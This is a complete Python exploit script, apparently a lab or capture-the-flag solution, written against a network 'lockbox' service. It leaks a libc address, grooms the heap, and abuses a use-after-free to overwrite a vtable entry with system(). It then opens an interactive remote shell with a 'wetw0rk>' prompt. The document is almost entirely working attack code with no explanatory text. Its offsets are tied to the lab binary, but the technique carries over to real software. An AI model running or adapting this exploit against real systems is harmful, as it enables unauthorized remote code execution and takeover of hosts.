#!/usr/bin/env python3
#
# lab9end: 1_d1dNt_3v3n_n33d_4_Hilti_DD350
#

import sys
import socket

class exploit():  

  def __init__(self, rhost, rport):

    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.sock.connect((rhost, rport))
    self.sock.settimeout(1)


  # run: The main function that handles exploitation from leak to RCE
  def run(self):

    if (len(self.recvall()) > 1):
      print("[*] Banner recieved, continuing exploitation")
    else:
      print("[-] Banner grab failed exiting...")
      exit(-1)

    libc_ptr = self.libc_leak()
    print("[*] Successfully leaked main arena ptr: 0x%x" % (libc_ptr))

    system = libc_ptr - 0x16a2c0
    binsh = libc_ptr - 0x49a2c

    print("[*] Allocating first chunk at index 4, in-mem-size: 0x18")
    self.do_new_set(4, 4)

    print("[*] Creating evil vtable entry ;)")
    self.do_add_item(4, system+1)

    print("[*] Allocating second chunk at index 3, in-mem-size: who cares?")
    self.do_new_set(3, 9)
    for i in range(9):
      self.do_add_item(3, (0x61616161+i))

    print("[*] Freeing heap allocation at index 3")
    self.do_del_set(3)

    print("[*] Freeing heap allocation at index 4, corrupting vtable")
    self.do_del_set(4)

    print("[+] Triggering UAF, calling evil vtable\n")
    self.do_find_item(4, binsh)

    while True:
      try:
        self.sock.send(input("wetw0rk> ").encode('latin-1') + b"\n")
        print(self.recvall())
      except:
        print("[-] Exiting shell...")
        exit(0)

  # libc_leak: Carefully setup the heap and leak an address in main arena
  def libc_leak(self):
    self.do_new_set(0, 8)
    self.do_new_set(1, 66)
    self.do_new_set(2, 1337)
 
    self.do_del_set(0)
    self.do_del_set(1)
 
    self.do_new_set(1, 66)
 
    leak = self.do_find_item(1, 0).split(b'=')[1].split(b'\n')[0].strip()
 
    return ( int(leak) + 0x100000000 )

  # do_del_set: Open a lockbox
  def do_new_set(self, lockbox, items):
    self.sendget(b"1\n")
    self.sendget(b"%d\n" % lockbox)
    return self.sendget((b"%d\n" % items), True)

  # do_add_item: Add an item to a lockbox
  def do_add_item(self, lockbox, item):
    self.sendget(b"2\n")
    self.sendget(b"%d\n" % lockbox)
    return self.sendget((b"%d\n" % item), True)

  # do_find_item: Get an item from a lockbox
  def do_find_item(self, lockbox, item):
    self.sendget(b"3\n")
    self.sendget(b"%d\n" % lockbox)
    return self.sendget((b"%d\n" % item), True)

  # do_del_set: Destroy your lockbox and items in it
  def do_del_set(self, lockbox):
    self.sendget(b"4\n")
    return self.sendget((b"%d\n" % lockbox), True)

  # sendget: send bytes and retrieve bytes (less code if in function)
  def sendget(self, message, print_output=False):
    self.sock.send(message)

    if print_output == False: 
      self.recvall()
    else:
      return self.recvall()

    return

  # recvall: Updated recvall, alot faster. code borrowed from BHP ;)
  def recvall(self):

    recv_len = 1
    response = b""

    while recv_len:

      # Timeout to handle EOF from sockfd
      try:
        rdata = self.sock.recv(4096)
        recv_len = len(rdata)
        response += rdata

        if recv_len < 4096:
          break
      except:
        break

    return response

def main():

  try:
    rhost = sys.argv[1]
    rport = int(sys.argv[2])
  except:
    print("Usage: ./%s <rhost> <rport>" % sys.argv[0])
    exit(-1)

  start = exploit(rhost, rport)
  start.run()

main()
